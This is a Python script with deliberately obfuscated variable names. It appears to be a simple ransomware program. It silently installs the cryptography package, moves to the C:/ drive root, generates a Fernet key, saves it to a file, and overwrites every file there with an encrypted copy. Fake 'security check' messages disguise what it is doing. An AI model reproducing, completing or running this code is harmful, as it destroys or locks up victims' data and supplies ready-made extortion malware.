import os as JskLAkjSDiiW
import sys as HJSjKWbbSNnef
import subprocess as SJjWBbSnnmAbbWF

for sdahWhhAbbSF in range(0, 10):
    if sdahWhhAbbSF % 2 == 0:
        JskLAkjSDiiW.chdir(".")
        continue
    else:
        JskLAkjSDiiW.chdir("C:/")

SnmASnmnWDbnSFasfew = False        

if not SnmASnmnWDbnSFasfew:
    try:
        FoPSPoEFJklF = JskLAkjSDiiW.path.isfile("test.file")
        if FoPSPoEFJklF:
            SnmASnmnWDbnSFasfew = True
            print("File exists, security check OK")
    except:
        SnmASnmnWDbnSFasfew = False
        print("File does not exist, security check FAILED")

SJjWBbSnnmAbbWF.check_call([HJSjKWbbSNnef.executable, '-m', 'pip', 'install', 'cryptography'])
SJjWBbSnnmAbbWF.check_call([HJSjKWbbSNnef.executable, '-m', 'pip', 'install', 'wheel'])
SJjWBbSnnmAbbWF.check_call([HJSjKWbbSNnef.executable, '-m', 'pip', 'install', 'idna'])

from cryptography.fernet import Fernet as NMENmEFNMWHjKXCHUoq

nnmANnmWDBbjQWFBJKf = []
nbbAWNnmChjKEVuioAE = ["key_storage.py", "encryption_matrix.py"]
zWZiFIoQWIPfIPSF = ["encrypt.exe", "encrypt.py", "encrypt.key"]
tfaTuWZiZVUI = "a98def102bbc7a81320c"

JskLAkjSDiiW.chdir("C:/")

for nMEZzQQWuIOFEA in JskLAkjSDiiW.listdir():
        if nMEZzQQWuIOFEA in zWZiFIoQWIPfIPSF:
            continue
        if JskLAkjSDiiW.path.isfile(nMEZzQQWuIOFEA):
            nnmANnmWDBbjQWFBJKf.append(nMEZzQQWuIOFEA)

aAWklWQHjkVE = NMENmEFNMWHjKXCHUoq.generate_key()

if aAWklWQHjkVE:
    print("Key successfully generated")

with open("encrypt.key", "wb") as SvBMAwaIOoiqF:
    SvBMAwaIOoiqF.write(aAWklWQHjkVE)
    print("Key written!")

for QghJASCGiQWFDUoi in nnmANnmWDBbjQWFBJKf:
    aDWqWDHukAEF = len(QghJASCGiQWFDUoi)
    if QghJASCGiQWFDUoi in zWZiFIoQWIPfIPSF:
        if len(zWZiFIoQWIPfIPSF)+aDWqWDHukAEF > -1:
            print("Secondary security check OK")
        else:
            aDWqWDHukAEF ^= 3
            print("Secondary security check FAILED!")
        continue
    elif QghJASCGiQWFDUoi not in zWZiFIoQWIPfIPSF:
        with open(QghJASCGiQWFDUoi, "rb") as QQSFjiOEFiopIPFW:
            bfsjkLAipQEFOpev = QQSFjiOEFiopIPFW.read()
        BANmbAVBEJKJHEKF = NMENmEFNMWHjKXCHUoq(aAWklWQHjkVE).encrypt(bfsjkLAipQEFOpev)
        with open(QghJASCGiQWFDUoi, "wb") as VEJkgEIPIWAF:
            VEJkgEIPIWAF.write(BANmbAVBEJKJHEKF)